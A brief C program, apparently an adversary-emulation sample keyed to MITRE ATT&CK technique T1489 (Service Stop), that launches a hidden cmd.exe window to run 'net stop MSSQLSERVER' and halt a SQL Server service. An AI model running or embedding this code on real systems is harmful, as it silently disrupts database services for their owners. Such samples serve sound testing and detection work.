// Link      = https://attack.mitre.org/techniques/T1489/
// Technique = Service Stop
// ID        = T1489
// Tactics   = Impact

#include <windows.h>

int main() {
    ShellExecuteA(
        NULL,
        "open",
        "cmd.exe",
        "C:\\Windows\\System32\\net.exe stop MSSQLSERVER",
        NULL,
        SW_HIDE
    );

    return 0;
}




